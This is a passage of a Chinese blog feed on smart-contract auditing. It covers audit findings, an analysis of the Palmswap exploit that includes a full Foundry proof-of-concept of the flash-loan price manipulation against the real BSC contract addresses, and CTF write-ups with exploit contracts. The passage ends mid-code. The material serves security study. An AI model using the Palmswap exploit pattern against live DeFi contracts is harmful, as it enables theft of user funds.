变量并没有被实际使用，但它会影响合约中的计算，导致算术下溢错误。在某些情况下，借款人即使满足所有其他扩展条件，仍然无法扩展贷款。<br>其实就是就是影响了用户的体验</p><h2 id="跳过白名单，直接阻断了后续的领取代币"><a href="#跳过白名单，直接阻断了后续的领取代币" class="headerlink" title="跳过白名单，直接阻断了后续的领取代币"></a>跳过白名单，直接阻断了后续的领取代币</h2><p>这个函数也是我反复看的，但是差点，没有发现如果直接return的话，那么就会导致后面满足白名单的人不能够领取奖励，又是一个遗憾</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function updateFunds(  </span><br><span class="line">    infoOfOffers[] memory informationOffers,  </span><br><span class="line">    address collateral,  </span><br><span class="line">    address[] memory lenders,  </span><br><span class="line">    address borrower  </span><br><span class="line">) public onlyAggregator &#123;  </span><br><span class="line">    for (uint i = 0; i &lt; lenders.length; i++) &#123;  </span><br><span class="line">        bool validPair = isPairWhitelisted[informationOffers[i].principle][  </span><br><span class="line">            collateral  </span><br><span class="line">        ];  </span><br><span class="line">        if (!validPair) &#123;  </span><br><span class="line">            return;  // 这里的return导致函数提前退出，跳过后续有效的配对</span><br><span class="line">        &#125;  </span><br><span class="line">        address principle = informationOffers[i].principle;  </span><br><span class="line">        uint _currentEpoch = currentEpoch();  </span><br><span class="line">        lentAmountPerUserPerEpoch[lenders[i]][  </span><br><span class="line">            hashVariables(principle, _currentEpoch)  </span><br><span class="line">        ] += informationOffers[i].principleAmount;  </span><br><span class="line">        totalUsedTokenPerEpoch[principle][  </span><br><span class="line">            _currentEpoch  </span><br><span class="line">        ] += informationOffers[i].principleAmount;  </span><br><span class="line">        borrowAmountPerEpoch[borrower][  </span><br><span class="line">            hashVariables(principle, _currentEpoch)  </span><br><span class="line">        ] += informationOffers[i].principleAmount;  </span><br><span class="line">        emit UpdatedFunds(  </span><br><span class="line">            lenders[i],  </span><br><span class="line">            principle,  </span><br><span class="line">            collateral,  </span><br><span class="line">            borrower,  </span><br><span class="line">            _currentEpoch  </span><br><span class="line">        );  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="FOT代币，在转账的时候会产生手续费，就会导致一些计算失败"><a href="#FOT代币，在转账的时候会产生手续费，就会导致一些计算失败" class="headerlink" title="FOT代币，在转账的时候会产生手续费，就会导致一些计算失败"></a>FOT代币，在转账的时候会产生手续费，就会导致一些计算失败</h2><p>在 TaxTokensReceipt 合约中，存在一个问题，导致 Fee-on-Transfer (FOT) 代币在存款时出现交易回滚。问题的根本原因是合约假设用户存入的代币数量与转账的实际数量相同，但对于 Fee-on-Transfer 代币，转账过程中会扣除一定的费用。因此，合约在检查代币差额时，总是期望接收到与用户指定数量相等的金额，但实际收到的数量较少，导致存款失败。<br>Fee-on-Transfer (FOT) 代币：这类代币在每次转账时会自动扣除一定比例的费用，导致转账到合约的实际金额（difference）少于用户指定的存款金额（amount）。<br>问题发生的位置：在 TaxTokensReceipt.sol 合约的 deposit() 函数中，合约将转账前后的余额差（difference）与用户指定的 amount 进行比较，假设两者应当相等。然而，由于 FOT 代币的费用机制，实际转账的金额始终少于用户指定的 amount，因此 difference &gt;&#x3D; amount 检查始终失败，导致交易回滚。</p><p>又是一个新的知识，FOT代币，会有手续费</p><h2 id="预言机没有检查时间过时，导致价格更新不一致"><a href="#预言机没有检查时间过时，导致价格更新不一致" class="headerlink" title="预言机没有检查时间过时，导致价格更新不一致"></a>预言机没有检查时间过时，导致价格更新不一致</h2><p>DebitaChainlink.sol 合约中的 getThePrice() 函数对 Chainlink 价格预言机的数据进行验证时，存在验证不完整的问题。虽然函数进行了一些基本的检查（如合约是否暂停、价格预言机是否存在、L2序列器是否正常等），但它缺少对价格更新时间戳、回合完整性以及回合排序的验证。这意味着，即使价格预言机的数据已经过时（但价格仍大于零），合约仍然会接受这些数据，可能导致使用陈旧或无效的价格。</p><p>根本原因：<br>getThePrice() 函数目前只验证了以下几点：</p><p>合约是否暂停（isPaused）。<br>价格预言机是否存在。<br>L2序列器是否正常（对于L2链）。<br>返回的价格是否大于零。<br>然而，它没有验证：</p><p>价格更新的时间戳（updatedAt）。<br>回合是否完整（answeredInRound）。<br>回合是否按顺序回答（answeredInRound &gt;&#x3D; roundId）。<br>合约中的 getThePrice() 函数从 Chainlink 价格预言机获取最新价格数据时，验证逻辑如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(, int price, , , ) = priceFeed.latestRoundData();  </span><br><span class="line">require(isFeedAvailable[_priceFeed], &quot;Price feed not available&quot;);  </span><br><span class="line">require(price &gt; 0, &quot;Invalid price&quot;);  </span><br></pre></td></tr></table></figure><p>但没有进一步验证价格是否来自一个有效的回合，或者回合是否完整。也没有检查 updatedAt 时间戳，可能导致使用陈旧的价格数据。具体来说，以下情况未被考虑：</p><p>时间戳验证缺失： 如果预言机数据的更新时间戳很久之前，那么这个价格数据就是“过时”的，应该拒绝使用。<br>回合完整性检查： 如果价格数据属于一个不完整的回合（例如，数据没有完全更新），则无法保证其准确性。<br>回合顺序验证： 需要确保返回的回合数据是按顺序的，否则有可能是过时的无效数据。</p><p>使用预言机的话，就要注意到这几个细节<br>配置更新时间阈值： 为了应对不同的市场环境，可以让合约所有者设置一个自定义的价格数据有效时间（比如，10分钟或者更短）。<br>价格验证事件： 在每次价格验证时，触发事件记录价格数据的验证状态，这有助于监控和审计价格来源的健康状态。<br>公开数据接口： 提供一个视图函数，返回包括时间戳和回合 ID 在内的完整价格数据，供外部用户验证和分析。<br>时间戳验证缺失： 如果预言机数据的更新时间戳很久之前，那么这个价格数据就是“过时”的，应该拒绝使用。<br>回合完整性检查： 如果价格数据属于一个不完整的回合（例如，数据没有完全更新），则无法保证其准确性。<br>回合顺序验证： 需要确保返回的回合数据是按顺序的，否则有可能是过时的无效数据。</p><h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2>]]></content>
      
      
      
        <tags>
            
            <tag> 审计报告 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Palmswap攻击事件的分析</title>
      <link href="/2024/11/23/Palmswap%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90/"/>
      <url>/2024/11/23/Palmswap%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="攻击介绍"><a href="#攻击介绍" class="headerlink" title="攻击介绍"></a>攻击介绍</h2><p>Palmswap由于其蹩脚的业务逻辑，导致了价格被黑客操控，导致被黑客盗取了大约$900K</p><h2 id="攻击分析"><a href="#攻击分析" class="headerlink" title="攻击分析"></a>攻击分析</h2><p>我们通过phalcon来分析。</p><p>通过调用栈发现，攻击者先贷了3,000,000的USDT，然后质押1,000,000的USDT来获得大约996,324的PLP，然后用剩下的2,000,000的USDT，去购买了USDP，然后攻击者销毁了持有的所有的PLP，但得到了大约1,947,570的USTD。最后卖出USDP,大约得到1,947,570的USDT。</p><p>显然，攻击者在通过购买USDP操纵了PLP的价格。</p><p> function getPrice(bool _maximise) external view returns (uint256) {<br>        uint256 aum &#x3D; getAum(_maximise);<br>        uint256 supply &#x3D; IERC20Upgradeable(plp).totalSupply();<br>        return (aum * PLP_PRECISION) &#x2F; supply;<br>    }</p><pre><code>function getAums() public view returns (uint256[] memory) &#123;    uint256[] memory amounts = new uint256[](2);    amounts[0] = getAum(true);    amounts[1] = getAum(false);    return amounts;&#125;function getAumInUsdp(bool maximise)    public    view    override    returns (uint256)&#123;    uint256 aum = getAum(maximise);    return (aum * (10**USDP_DECIMALS)) / PRICE_PRECISION;&#125;function getAum(bool maximise) public view returns (uint256) &#123;    uint256 length = vault.allWhitelistedTokensLength();    uint256 aum = aumAddition;    IVault _vault = vault;    uint256 collateralTokenPrice = maximise        ? _vault.getMaxPrice(collateralToken)        : _vault.getMinPrice(collateralToken);    uint256 collateralDecimals = _vault.tokenDecimals(collateralToken);    uint256 currentAmmDeduction = (vault.permanentPoolAmount() *        collateralTokenPrice) / (10**collateralDecimals);    aum +=        (vault.poolAmount() * collateralTokenPrice) /        (10**collateralDecimals);    .......</code></pre><p>很明显攻击者通过买USDP来使Price增大。然后通过移除流动性获利。</p><p>POC<br>pragma solidity ^0.8.10;</p><p>import “forge-std&#x2F;Test.sol”;<br>import “.&#x2F;interface.sol”;</p><p>&#x2F;&#x2F; Vulnerable Contract : <a href="https://bscscan.com/address/0xd990094a611c3de34664dd3664ebf979a1230fc1">https://bscscan.com/address/0xd990094a611c3de34664dd3664ebf979a1230fc1</a><br>&#x2F;&#x2F; Attack Tx : <a href="https://bscscan.com/tx/0x62dba55054fa628845fecded658ff5b1ec1c5823f1a5e0118601aa455a30eac9">https://bscscan.com/tx/0x62dba55054fa628845fecded658ff5b1ec1c5823f1a5e0118601aa455a30eac9</a></p><p>interface IVault {<br>    function buyUSDP(address _receiver) external returns (uint256);</p><pre><code>function sellUSDP(address _receiver) external returns (uint256);</code></pre><p>}</p><p>interface ILiquidityEvent {<br>    function purchasePlp(uint256 _amountIn, uint256 _minUsdp, uint256 _minPlp) external returns (uint256 amountOut);</p><pre><code>function unstakeAndRedeemPlp(uint256 _plpAmount, uint256 _minOut, address _receiver) external returns (uint256);</code></pre><p>}</p><p>contract PalmswapTest is Test {<br>    IERC20 BUSDT &#x3D; IERC20(0x55d398326f99059fF775485246999027B3197955);<br>    IERC20 PLP &#x3D; IERC20(0x8b47515579c39a31871D874a23Fb87517b975eCC);<br>    IERC20 USDP &#x3D; IERC20(0x04C7c8476F91D2D6Da5CaDA3B3e17FC4532Fe0cc);<br>    IVault Vault &#x3D; IVault(0x806f709558CDBBa39699FBf323C8fDA4e364Ac7A);<br>    ILiquidityEvent LiquidityEvent &#x3D; ILiquidityEvent(0xd990094A611c3De34664dd3664ebf979A1230FC1);<br>    IAaveFlashloan RadiantLP &#x3D; IAaveFlashloan(0xd50Cf00b6e600Dd036Ba8eF475677d816d6c4281);<br>    address private constant plpManager &#x3D; 0x6876B9804719d8D9F5AEb6ad1322270458fA99E0;<br>    address private constant fPLP &#x3D; 0x305496cecCe61491794a4c36D322b42Bb81da9c4;</p><pre><code>CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);function setUp() public &#123;    cheats.createSelectFork(&quot;bsc&quot;, 30_248_637);    cheats.label(address(BUSDT), &quot;BUSDT&quot;);    cheats.label(address(PLP), &quot;PLP&quot;);    cheats.label(address(USDP), &quot;USDP&quot;);    cheats.label(address(Vault), &quot;Vault&quot;);    cheats.label(address(LiquidityEvent), &quot;LiquidityEvent&quot;);    cheats.label(address(RadiantLP), &quot;RadiantLP&quot;);    cheats.label(plpManager, &quot;plpManager&quot;);    cheats.label(fPLP, &quot;fPLP&quot;);&#125;  function testExploit() public &#123;    deal(address(BUSDT), address(this), 0);    BUSDT.approve(plpManager, type(uint256).max);    BUSDT.approve(address(RadiantLP), type(uint256).max);    PLP.approve(fPLP, type(uint256).max);    takeFlashLoanOnRadiant();&#125;function executeOperation(    address[] calldata assets,    uint256[] calldata amounts,    uint256[] calldata premiums,    address initiator,    bytes calldata params) external returns (bool) &#123;       uint256 amountOut = LiquidityEvent.purchasePlp(1_000_000 * 1e18, 0, 0);    BUSDT.transfer(address(Vault), 2_000_000 * 1e18);    Vault.buyUSDP(address(this));        uint256 amountUSDP = LiquidityEvent.unstakeAndRedeemPlp(amountOut - 13_294 * 1e15, 0, address(this));    USDP.transfer(address(Vault), amountUSDP - 3154 * 1e18);    Vault.sellUSDP(address(this));    return true;&#125;function takeFlashLoanOnRadiant() internal &#123;    address[] memory assets = new address[](1);    assets[0] = address(BUSDT);    uint256[] memory amounts = new uint256[](1);    amounts[0] = 3_000_000 * 1e18;    uint256[] memory modes = new uint256[](1);    modes[0] = 0;    RadiantLP.flashLoan(address(this), assets, amounts, modes, address(this), bytes(&quot;&quot;), 0);&#125;</code></pre><p>}</p>]]></content>
      
      
      
        <tags>
            
            <tag> 攻击事件的分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Factorial</title>
      <link href="/2024/11/21/CTF-Factorial/"/>
      <url>/2024/11/21/CTF-Factorial/</url>
      
        <content type="html"><![CDATA[<p>题目源代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">contract Factorial &#123;</span><br><span class="line">    bool public solved = false;</span><br><span class="line"></span><br><span class="line">    function run(uint256 number) internal view returns (uint256) &#123;</span><br><span class="line">        uint256 res = 1;</span><br><span class="line">        for (uint256 index = 0; index &lt; number; index++) &#123;</span><br><span class="line">            (, bytes memory data) = msg.sender.staticcall(abi.encodeWithSignature(&quot;factorial(uint256)&quot;, number));</span><br><span class="line">            res = res * abi.decode(data, (uint256));</span><br><span class="line">        &#125;</span><br><span class="line">        return res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function solve() public &#123;</span><br><span class="line">        require(run(5) == 120, &quot;wrong&quot;);</span><br><span class="line">        solved = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>阅读代码，就是五次返回值的乘积要为120，又了解到一个新知识，冷地址和新地址</p><blockquote><p>热地址（Hot Address）：在 EVM 中，”热” 地址通常指的是近期被频繁访问过的地址或合约。这些地址的数据和代码可能已经被加载到 EVM 的缓存中，因此访问这些地址会更快，消耗的 gas 较少。<br>冷地址（Cold Address）：冷地址通常指的是很少被访问的地址，或者是很久没有与之交互的合约地址。当你访问这些冷地址时，由于 EVM 可能需要重新加载代码和数据，导致访问时的 gas 消耗更高。<br>然后就可以先使用热地址，返回120，接下来再使用冷地址返回1，这样他们的乘积就能返回120了</p></blockquote><p>攻击代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">interface IFactorial &#123;</span><br><span class="line">    function solve() external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Exploit &#123;</span><br><span class="line">    IFactorial level;</span><br><span class="line"></span><br><span class="line">    // construct() &#123;&#125; // construct not allowed</span><br><span class="line"></span><br><span class="line">    function exploit() public &#123;</span><br><span class="line">        // write code here</span><br><span class="line">        address target = 0x1963ead4de36524e8EB53B88ccf79ff15Fe20baB;</span><br><span class="line">        level = IFactorial(target);</span><br><span class="line">        level.solve();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function factorial(uint256) public view returns (bytes32) &#123;</span><br><span class="line">        uint startGas = gasleft();</span><br><span class="line">        uint bal = address(0x100).balance;</span><br><span class="line">        uint usedGas = startGas - gasleft();</span><br><span class="line">        if (usedGas &lt; 1000) &#123;</span><br><span class="line">            bytes32 data01 = bytes32(uint256(1));</span><br><span class="line">            return data01;</span><br><span class="line">        &#125;</span><br><span class="line">        bytes32 data02 = bytes32(uint256(120));</span><br><span class="line">        return data02;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-BabyOtter</title>
      <link href="/2024/11/21/CTF-BabyOtter/"/>
      <url>/2024/11/21/CTF-BabyOtter/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-BabyOtter"><a href="#CTF-BabyOtter" class="headerlink" title="CTF-BabyOtter"></a>CTF-BabyOtter</h1><p>题目源代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">contract BabyOtter &#123;</span><br><span class="line">    bool public solved = false;</span><br><span class="line"></span><br><span class="line">    function solve(uint x) public &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            assert(x * 0x1337 == 1);</span><br><span class="line">        &#125;</span><br><span class="line">        solved = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个题，有个unchecked</p><blockquote><p>它是一个不对溢出进行的一个检查unchecked 是一个特殊的关键字，表示在代码块中进行运算时不进行溢出检查。这意味着即使在某些情况下会发生溢出，也不会触发 Solidity 默认的溢出检查错误。</p></blockquote><p>那么就很容易想到溢出来解决这个题了<br>攻击代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">interface IBabyOtter &#123;</span><br><span class="line">    function solve(uint x) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Exploit &#123;</span><br><span class="line">    function exploit() public &#123;</span><br><span class="line">        uint number = 106517423012574869748253447278778772725360170890836257832597187972312850502279;</span><br><span class="line">        address target = 0x4e309C767Acc9f9366d75C186454ed205d5Eeee3;</span><br><span class="line">        IBabyOtter(target).solve(number);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-AdultOtter</title>
      <link href="/2024/11/21/CTF-AdultOtter/"/>
      <url>/2024/11/21/CTF-AdultOtter/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-AdultOtter"><a href="#CTF-AdultOtter" class="headerlink" title="CTF-AdultOtter"></a>CTF-AdultOtter</h1><p>题目源代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">contract AdultOtter &#123;</span><br><span class="line">    bool public solved = false;</span><br><span class="line"></span><br><span class="line">    function pwn(uint[16] memory code) public &#123;</span><br><span class="line">      uint[16] memory a;</span><br><span class="line">      uint[16] memory b;</span><br><span class="line"></span><br><span class="line">      for (uint i = 0; i &lt; 16; i++) &#123;</span><br><span class="line">        assert(1337 * i &lt; code[i] &amp;&amp; code[i] &lt; 1337 * (i + 1));</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      for (uint i = 0; i &lt; 16; i++) &#123;</span><br><span class="line">        a[i] = i**i * code[i];</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      for (uint i = 1; i &lt; 16; i++) &#123;</span><br><span class="line">        b[i] = (2**255 + code[i] - 7 * a[i] + b[i-1]) % 2**64;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      assert(b[15] == 0);</span><br><span class="line">      solved = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这就是一道计算题，<br>其实就是使code[15] - 7 <em>i ** i * code[15] + code[14] - 7 <em>i</em></em> i * code[14] +  ……  code[1] - 7 *i ** i * code[1]+ b[0] 为2**64倍数即可。<br>答案：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">interface IAdultOtter &#123;</span><br><span class="line">    function pwn(uint[16] memory code) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Exploit&#123;</span><br><span class="line"></span><br><span class="line">    function exploit() public  &#123;</span><br><span class="line">    address addr = 0x6D40aCf2EF8F8F99247666AEE922E79CB605DE3B;</span><br><span class="line">    uint[16] memory DataNumber;</span><br><span class="line">    DataNumber[0] = 11;</span><br><span class="line">    DataNumber[1] = 1513;</span><br><span class="line">    DataNumber[2] = 3859;</span><br><span class="line">    DataNumber[3] = 5192;</span><br><span class="line">    DataNumber[4] = 6112;</span><br><span class="line">    DataNumber[5] = 7966;</span><br><span class="line">    DataNumber[6] = 9263;</span><br><span class="line">    DataNumber[7] = 10432;</span><br><span class="line">    DataNumber[8] = 11709;</span><br><span class="line">    DataNumber[9] = 13320;</span><br><span class="line">    DataNumber[10] = 14564;</span><br><span class="line">    DataNumber[11] = 15480;</span><br><span class="line">    DataNumber[12] = 16614;</span><br><span class="line">    DataNumber[13] = 18200;</span><br><span class="line">    DataNumber[14] = 19485;</span><br><span class="line">    DataNumber[15] = 21344;</span><br><span class="line">    IAdultOtter(addr).pwn(DataNumber);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sherlock-2024-11-VVV审计报告</title>
      <link href="/2024/11/17/sherlock-2024-11-VVV%E5%AE%A1%E8%AE%A1%E6%8A%A5%E5%91%8A/"/>
      <url>/2024/11/17/sherlock-2024-11-VVV%E5%AE%A1%E8%AE%A1%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<h1 id="一"><a href="#一" class="headerlink" title="一"></a>一</h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>If the admin records the investment using the investment token instead of the stablecoin, it will lead to an error.</p><h2 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h2><p>Vulnerable code:</p><p>2024-11-vvv-exchange-update-HeYuan-33&#x2F;vvv-platform-smart-contracts&#x2F;contracts&#x2F;vc&#x2F;VVVVCInvestmentLedger.sol</p><p>Lines 268 to 277 in c1e47db</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for (uint256 i = 0; i &lt; _kycAddresses.length; i++) &#123; </span><br><span class="line">    address kycAddress = _kycAddresses[i]; </span><br><span class="line">    uint256 investmentRound = _investmentRounds[i]; </span><br><span class="line">    uint256 amountToInvest = _amountsToInvest[i]; </span><br><span class="line">  </span><br><span class="line">    kycAddressInvestedPerRound[kycAddress][investmentRound] += amountToInvest; </span><br><span class="line">    totalInvestedPerRound[investmentRound] += amountToInvest; </span><br><span class="line">    emit VCInvestment(investmentRound, address(0), kycAddress, 0, 0, 0, amountToInvest); </span><br><span class="line">&#125; </span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>From the above, we can see that there is no validation for the investment amount, which can lead to issues such as the admin passing a non-stablecoin investment. This could result in errors, or if a zero investment amount is recorded, it could cause subsequent operations to fail or behave incorrectly.</p><h2 id="Internal-pre-conditions"><a href="#Internal-pre-conditions" class="headerlink" title="Internal pre-conditions"></a>Internal pre-conditions</h2><p>When the admin calls the addInvestmentRecords function and passes the uint256[] calldata _amountsToInvest, it is an investment amount array that has not been validated.</p><h2 id="External-pre-conditions"><a href="#External-pre-conditions" class="headerlink" title="External pre-conditions"></a>External pre-conditions</h2><p>This leads to the admin recording incorrect investments for the investor. As a result, when the investor later claims project tokens, they may receive an incorrect amount of tokens.</p><h2 id="Attack-Path"><a href="#Attack-Path" class="headerlink" title="Attack Path"></a>Attack Path</h2><p>No response</p><h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><p>If the admin makes an incorrect investment record, and it is irreversible, it will lead to an irreversible error. Additionally, if a zero investment amount is recorded, it will also affect subsequent calculations.</p><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p>No response</p><h2 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h2><p>I recommend adding a validation check for the uint256[] calldata _amountsToInvest when recording investment amounts,When passing parameters, add a token address to check whether it is a stablecoin.as shown below:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function addInvestmentRecords(</span><br><span class="line">    address[] calldata _kycAddresses,</span><br><span class="line">    uint256[] calldata _investmentRounds,</span><br><span class="line">    uint256[] calldata _amountsToInvest,</span><br><span class="line">    address _investmentTokenAddress  // New parameter for token address</span><br><span class="line">) external onlyAuthorized &#123;</span><br><span class="line"> for (uint256 i = 0; i &lt; _kycAddresses.length; i++) &#123;</span><br><span class="line">            address kycAddress = _kycAddresses[i];</span><br><span class="line">            uint256 investmentRound = _investmentRounds[i];</span><br><span class="line"></span><br><span class="line">            // Check if the investment amount is greater than zero</span><br><span class="line">             require(amountToInvest &gt; 0, &quot;Investment amount must be greater than zero&quot;);</span><br><span class="line"></span><br><span class="line">        // Check if the investment amount matches the expected token type</span><br><span class="line">        // Assuming the expected investment token is a stablecoin</span><br><span class="line">                address expectedToken = address(0xStableCoinAddress);</span><br><span class="line">               require( _investmentTokenAddress == expectedToken, &quot;Investment amount must be in the expected stablecoin type&quot;);</span><br><span class="line">               uint256 amountToInvest = _amountsToInvest[i];</span><br><span class="line"></span><br><span class="line">            kycAddressInvestedPerRound[kycAddress][investmentRound] += amountToInvest;</span><br><span class="line">            totalInvestedPerRound[investmentRound] += amountToInvest;</span><br><span class="line">            emit VCInvestment(investmentRound, address(0), kycAddress, 0, 0, 0, amountToInvest);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>I believe this is the best way to ensure the safety of investment records and prevent any potential errors from occurring.</p><h1 id="二"><a href="#二" class="headerlink" title="二"></a>二</h1><h2 id="Summary-1"><a href="#Summary-1" class="headerlink" title="Summary"></a>Summary</h2><p>Due to the lack of a minimum investment amount requirement, attackers can make a large number of malicious investments with a zero investment amount, consuming the investment round’s time and preventing other users from making legitimate investments.</p><h2 id="Root-Cause-1"><a href="#Root-Cause-1" class="headerlink" title="Root Cause"></a>Root Cause</h2><p>Vulnerable Code</p><p>2024-11-vvv-exchange-update-HeYuan-33&#x2F;vvv-platform-smart-contracts&#x2F;contracts&#x2F;vc&#x2F;VVVVCInvestmentLedger.sol</p><p>Lines 143 to 156 in c1e47db</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (investmentIsPaused) revert InvestmentPaused(); </span><br><span class="line"> </span><br><span class="line">// check if signature is valid </span><br><span class="line">if (!_isSignatureValid(_params)) &#123; </span><br><span class="line">    revert InvalidSignature(); </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line">// check if the investment round is active </span><br><span class="line">if ( </span><br><span class="line">    block.timestamp &lt; _params.investmentRoundStartTimestamp || </span><br><span class="line">    block.timestamp &gt; _params.investmentRoundEndTimestamp </span><br><span class="line">) &#123; </span><br><span class="line">    revert InactiveInvestmentRound(); </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>here is no check for the minimum investment amount here; The check only verifies if the basic requirements are met.</p><h2 id="Internal-pre-conditions-1"><a href="#Internal-pre-conditions-1" class="headerlink" title="Internal pre-conditions"></a>Internal pre-conditions</h2><p>The investment meets some basic requirements, as follows:</p><p>if (investmentIsPaused) revert InvestmentPaused();</p><pre><code>    // check if signature is valid    if (!_isSignatureValid(_params)) &#123;        revert InvalidSignature();    &#125;    // check if the investment round is active    if (        block.timestamp &lt; _params.investmentRoundStartTimestamp ||        block.timestamp &gt; _params.investmentRoundEndTimestamp    ) &#123;        revert InactiveInvestmentRound();    &#125;</code></pre><p>This allows attackers to send a large number of zero-amount investments, causing other users’ investment requests to experience prolonged delays，Miss the investment round</p><h2 id="External-pre-conditions-1"><a href="#External-pre-conditions-1" class="headerlink" title="External pre-conditions"></a>External pre-conditions</h2><p>No response</p><h2 id="Attack-Path-1"><a href="#Attack-Path-1" class="headerlink" title="Attack Path"></a>Attack Path</h2><p>The attacker first calls the invest function, sending a large number of zero-amount investment requests. The contract can only slowly process the attacker’s requests, consuming the time allocated for the investment round.</p><h2 id="Impact-1"><a href="#Impact-1" class="headerlink" title="Impact"></a>Impact</h2><p>Possible consequences:</p><p>DOS (Denial of Service) attack<br>High gas consumption<br>Excessive array iteration: Due to the length limitation of the investor address array, this can cause the administrator to take an excessive amount of time to add investment records.<br> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  function addInvestmentRecords(</span><br><span class="line">        address[] calldata _kycAddresses,</span><br><span class="line">        uint256[] calldata _investmentRounds,</span><br><span class="line">        uint256[] calldata _amountsToInvest</span><br><span class="line">    ) external onlyAuthorized </span><br><span class="line">     //...</span><br><span class="line">        for (uint256 i = 0; i &lt; _kycAddresses.length; i++) &#123;</span><br><span class="line">            address kycAddress = _kycAddresses[i];</span><br><span class="line">            uint256 investmentRound = _investmentRounds[i];</span><br><span class="line">            uint256 amountToInvest = _amountsToInvest[i];</span><br><span class="line">//...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="PoC-1"><a href="#PoC-1" class="headerlink" title="PoC"></a>PoC</h2><p>No response</p><h2 id="Mitigation-1"><a href="#Mitigation-1" class="headerlink" title="Mitigation"></a>Mitigation</h2><p>You can take the following measures:</p><p>Set a minimum investment amount<br>Modify the investment address array to have a fixed length<br>Add a check to ensure the investment amount is not zero, as follows:<br>  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (investmentIsPaused) revert InvestmentPaused();</span><br><span class="line"></span><br><span class="line">      // check if signature is valid</span><br><span class="line">      if (!_isSignatureValid(_params)) &#123;</span><br><span class="line">          revert InvalidSignature();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      // check if the investment round is active</span><br><span class="line">      if (</span><br><span class="line">          block.timestamp &lt; _params.investmentRoundStartTimestamp ||</span><br><span class="line">          block.timestamp &gt; _params.investmentRoundEndTimestamp</span><br><span class="line">      ) &#123;</span><br><span class="line">          revert InactiveInvestmentRound();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">     //check if the _params.amountToInvest isn&#x27;t 0</span><br><span class="line">   if( 